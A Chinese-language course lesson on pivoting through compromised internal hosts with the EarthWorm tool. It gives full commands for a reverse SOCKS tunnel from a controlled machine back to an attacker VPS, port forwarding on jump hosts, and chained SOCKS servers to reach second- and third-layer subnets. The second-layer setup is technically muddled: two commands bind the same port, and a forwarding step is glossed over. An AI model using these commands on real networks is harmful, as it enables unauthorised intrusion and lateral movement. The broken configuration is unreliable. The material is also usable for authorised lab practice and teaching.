## 一层Socks代理回顾

![](img/d262e65f8da318e2c4cec3db859f728b_21.png)

![](img/d262e65f8da318e2c4cec3db859f728b_23.png)

首先，我们回顾建立一层Socks代理的步骤。此方法用于将我们的流量代理到内网的第一层网段（例如 `192.168.2.0/24`）。

![](img/d262e65f8da318e2c4cec3db859f728b_25.png)

![](img/d262e65f8da318e2c4cec3db859f728b_27.png)

在VPS（攻击者机器）上，我们使用 `rcsocks` 命令监听一个端口，等待目标机器反向连接。其核心作用是进行**流量转发**。

![](img/d262e65f8da318e2c4cec3db859f728b_29.png)

![](img/d262e65f8da318e2c4cec3db859f728b_31.png)

![](img/d262e65f8da318e2c4cec3db859f728b_33.png)

**命令示例：**
```
./ew -s rcsocks -l 10088 -e 888
```
*   `-s rcsocks`: 指定为反向Socks服务器模式。
*   `-l 10088`: 在VPS本地监听10088端口，作为Socks5代理入口。
*   `-e 888`: 指定等待连接的目标端口为888。

![](img/d262e65f8da318e2c4cec3db859f728b_35.png)

在已控制的内网第一层主机（Target 1）上，我们执行命令主动连接VPS，建立反向Socks通道。

**命令示例：**
```
./ew -s rssocks -d [VPS_IP] -e 888
```
*   `-s rssocks`: 指定为反向Socks客户端模式。
*   `-d [VPS_IP]`: 指定VPS的IP地址。
*   `-e 888`: 连接到VPS的888端口。

连接建立后，我们即可将浏览器的Socks5代理设置为 `VPS_IP:10088`，从而访问Target 1所在网段（如 `192.168.2.2`）的资源。流量走向为：浏览器 -> VPS:10088 -> 反向通道 -> Target 1 -> 目标内网主机。

## 创建二层Socks代理

现在，假设我们需要通过第一层主机（Target 1，IP为 `192.168.2.2`）去访问更深层的第二层网络（例如 `192.168.33.0/24` 网段的主机Target 2，IP为 `192.168.33.33`）。这就需要建立二层代理。

![](img/d262e65f8da318e2c4cec3db859f728b_37.png)

![](img/d262e65f8da318e2c4cec3db859f728b_38.png)

![](img/d262e65f8da318e2c4cec3db859f728b_39.png)

二层代理的核心思路是：在已建立的一层代理基础上，在跳板机（Target 1）上再做一次**流量转发**，将来自VPS的代理流量，导向第二层网络。

![](img/d262e65f8da318e2c4cec3db859f728b_41.png)

![](img/d262e65f8da318e2c4cec3db859f728b_42.png)

![](img/d262e65f8da318e2c4cec3db859f728b_44.png)

以下是具体的操作步骤和命令。

![](img/d262e65f8da318e2c4cec3db859f728b_46.png)

### 第一步：在VPS上启动反向Socks服务

![](img/d262e65f8da318e2c4cec3db859f728b_48.png)

![](img/d262e65f8da318e2c4cec3db859f728b_50.png)

此步骤与一层代理完全相同，在VPS上监听一个端口（如10088），等待内网主机连接。

![](img/d262e65f8da318e2c4cec3db859f728b_52.png)

![](img/d262e65f8da318e2c4cec3db859f728b_53.png)

![](img/d262e65f8da318e2c4cec3db859f728b_55.png)

**VPS执行：**
```
./ew -s rcsocks -l 10088 -e 888
```

![](img/d262e65f8da318e2c4cec3db859f728b_57.png)

![](img/d262e65f8da318e2c4cec3db859f728b_59.png)

![](img/d262e65f8da318e2c4cec3db859f728b_61.png)

### 第二步：在Target 1上连接VPS并启动流量转发

![](img/d262e65f8da318e2c4cec3db859f728b_63.png)

![](img/d262e65f8da318e2c4cec3db859f728b_65.png)

![](img/d262e65f8da318e2c4cec3db859f728b_67.png)

![](img/d262e65f8da318e2c4cec3db859f728b_68.png)

在Target 1上，我们需要执行两个操作：
1.  连接VPS，建立反向Socks通道（与一层代理相同）。
2.  在本地进行流量转发，将来自某个端口的流量，导向第二层网络的目标主机和端口。

![](img/d262e65f8da318e2c4cec3db859f728b_70.png)

**Target 1执行：**
```
# 1. 连接VPS，建立反向Socks通道
./ew -s rssocks -d [VPS_IP] -e 888

![](img/d262e65f8da318e2c4cec3db859f728b_72.png)

# 2. 在本地进行流量转发 (需另起一个终端或后台运行)
./ew -s lcx_listen -l 9999 -e 7777
```
*   `-s lcx_listen`: 使用lcx的监听模式，在本地进行端口绑定和转发。
*   `-l 9999`: 在Target 1本地监听9999端口。
*   `-e 7777`: 指定转发到的目标端口为7777。

**此命令的作用是**：将发送到Target 1的9999端口的流量，转发到本机的7777端口。但此时7777端口尚未有服务监听，因此需要下一步。

![](img/d262e65f8da318e2c4cec3db859f728b_74.png)

![](img/d262e65f8da318e2c4cec3db859f728b_76.png)

![](img/d262e65f8da318e2c4cec3db859f728b_78.png)

### 第三步：在Target 1上启动正向Socks服务

![](img/d262e65f8da318e2c4cec3db859f728b_80.png)

![](img/d262e65f8da318e2c4cec3db859f728b_82.png)

我们需要在Target 1上启动一个正向的Socks5代理服务，监听在第二步中指定的转发目标端口（7777）上。这样，来自9999端口的流量就会被转到这个Socks代理，从而进入第二层网络。

![](img/d262e65f8da318e2c4cec3db859f728b_84.png)

![](img/d262e65f8da318e2c4cec3db859f728b_86.png)

![](img/d262e65f8da318e2c4cec3db859f728b_88.png)

**Target 1执行（另一个命令）：**
```
./ew -s ssocksd -l 7777
```
*   `-s ssocksd`: 启动一个正向的Socks5服务器。
*   `-l 7777`: 监听本地的7777端口。

![](img/d262e65f8da318e2c4cec3db859f728b_90.png)

![](img/d262e65f8da318e2c4cec3db859f728b_92.png)

![](img/d262e65f8da318e2c4cec3db859f728b_94.png)

![](img/d262e65f8da318e2c4cec3db859f728b_95.png)

**至此，流量通道建立完成**。其完整走向为：
1.  浏览器设置代理为 `VPS_IP:10088`。
2.  流量到达VPS的10088端口，通过第一步建立的反向通道，到达Target 1。
3.  Target 1上的 `lcx_listen` 将流量从888端口（反向通道入口）转发到本地的9999端口（此步骤由EW内部处理，无需额外命令，示意图中体现为流量从VPS经通道到达Target 1后，被导向9999端口）。
4.  Target 1上监听9999端口的 `lcx_listen` 再将流量转发到7777端口。
5.  7777端口由正向Socks服务 (`ssocksd`) 监听，该服务将流量代理到Target 1所能访问的第二层网络（如 `192.168.33.33`）。

![](img/d262e65f8da318e2c4cec3db859f728b_97.png)

![](img/d262e65f8da318e2c4cec3db859f728b_99.png)

通过此配置，我们就能访问 `192.168.33.33` 上的服务了。

![](img/d262e65f8da318e2c4cec3db859f728b_101.png)

## 扩展到三层及更多层代理

![](img/d262e65f8da318e2c4cec3db859f728b_103.png)

![](img/d262e65f8da318e2c4cec3db859f728b_105.png)

理解了二层代理的原理后，扩展到三层或更多层网络就清晰了。每一层代理都是在当前已控制的跳板机上，增加一个 `lcx_tran` 或 `lcx_listen` 的流量转发环节，将流量导向下一层网络的正向Socks代理。

![](img/d262e65f8da318e2c4cec3db859f728b_107.png)

![](img/d262e65f8da318e2c4cec3db859f728b_108.png)

![](img/d262e65f8da318e2c4cec3db859f728b_109.png)

![](img/d262e65f8da318e2c4cec3db859f728b_110.png)

**核心公式可以概括为：**
```
[攻击者] <--(反向Socks)--> [VPS] <--(反向通道)--> [跳板机1] <--(流量转发)--> [Socks代理] --> [跳板机2] <--(流量转发)--> [Socks代理] --> ... --> [目标内网]
```

![](img/d262e65f8da318e2c4cec3db859f728b_112.png)

![](img/d262e65f8da318e2c4cec3db859f728b_114.png)

![](img/d262e65f8da318e2c4cec3db859f728b_116.png)

例如，若要访问第三层网络（`192.168.44.44`），在控制第二层主机（Target 2）后，需要在其上：
1.  启动一个正向Socks服务（如监听6666端口）。
2.  使用 `lcx_tran` 将来自上层（Target 1）转发来的流量（如Target 2的7777端口），导向本地的正向Socks端口（6666）。

![](img/d262e65f8da318e2c4cec3db859f728b_118.png)

![](img/d262e65f8da318e2c4cec3db859f728b_120.png)

**Target 2 上可能的命令：**
```
# 启动正向Socks服务
./ew -s ssocksd -l 6666

# 进行流量转发（假设从7777端口接收流量）
./ew -s lcx_tran -l 7777 -f 127.0.0.1 -g 6666
```
*   `-s lcx_tran`: 本地端口转发模式。
*   `-l 7777`: 监听本地7777端口。
*   `-f 127.0.0.1 -g 6666`: 将接收到的流量转发到本机127.0.0.1的6666端口。

同时，需要修改上一层（Target 1）的转发规则，将其指向Target 2的IP和相应端口。

## 操作注意事项与排错

在实践过程中，可能会遇到各种问题。以下是关键的排错点：

1.  **端口占用**：执行新命令前，确保所需端口未被占用。可使用 `netstat -tunlp` 查看，并用 `kill` 命令结束冲突进程。
2.  **命令参数准确**：仔细检查每条命令的IP地址、端口号是否与当前网络拓扑匹配。一个字符错误都可能导致连接失败。
3.  **理解流量走向**：务必在操作前画出示意图，明确每一跳的源IP、端口和目标IP、端口。这有助于快速定位故障环节。
4.  **按顺序执行**：代理的建立有依赖关系。通常顺序是：VPS监听 -> 跳板机连接VPS -> 跳板机启动转发和Socks服务 -> 下一层跳板机重复此过程。
5.  **查看连接状态**：执行命令后，注意观察终端输出，确认 “OK” 或 “success” 等提示，表示该环节已成功。

## 总结

本节课中我们一起学习了使用EW工具创建二层及三层Socks代理的技术。关键点在于理解**多层代理的本质是多次流量转发**。我们通过 `rcsocks`/`rssocks` 建立从内网到VPS的反向通道，再在每一层跳板机上利用 `lcx_listen`、`lcx_tran` 和 `ssocksd` 将流量逐层向内网深处传递。

掌握此技术后，你便能够穿透复杂的多层内网环境，访问更深层的目标主机。请务必结合实验环境多加练习，并仔细理解每一步的流量走向，这是掌握内网穿透技术的核心。
